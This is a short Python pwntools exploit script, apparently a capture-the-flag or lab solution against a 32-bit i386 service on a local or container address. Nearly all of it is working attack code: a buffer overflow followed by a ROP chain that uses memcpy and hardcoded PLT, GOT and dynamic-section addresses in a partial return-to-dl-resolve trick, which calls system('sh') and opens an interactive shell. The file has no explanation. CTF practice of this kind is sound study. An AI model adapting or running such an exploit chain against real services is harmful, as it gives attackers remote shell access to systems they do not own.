#!/usr/bin/env python

from pwn import *

context.arch='i386'

#r = remote('127.0.0.1', 4000)
r = remote('172.17.0.2', 4000)

# partial ver
read = 0x8048310
memcpy = 0x8048320
plt0 = 0x8048300
pop3 = 0x80484f9
pop2 = 0x80484fa
pop1 = 0x80484fb
got1 = 0x804a004
gmon = 0x8048330

buf = 0x804a060
s = buf + 1024
d = buf + 2048

dynamic = 0x08049f14
relplt = 0x80482b4
dynsym = 0x80481cc
dynstr = 0x804822c

rop = flat(
    memcpy, pop3, s+32, got1, 4,  # 20
    memcpy, pop3, buf, 0x00, 56,  # 40
    memcpy, pop3, buf+52, d, 4,   # 60
    memcpy, pop3, s+88, got1, 4,  # 80
    memcpy, pop3, 0x00, buf, 56,  # 100
    gmon, 0xdeadbeef, d + 20, 
    )

data = flat( 
    d+4, # 4
    [5, d+12-56], # 12
    'system\x00\x00', # 20
    'sh\x00'
    )

raw_input('@')
r.send(('A'*18 + p32(buf+1024+4)).ljust(1024, '\0') + rop.ljust(1024, '\0') + data)

r.interactive()
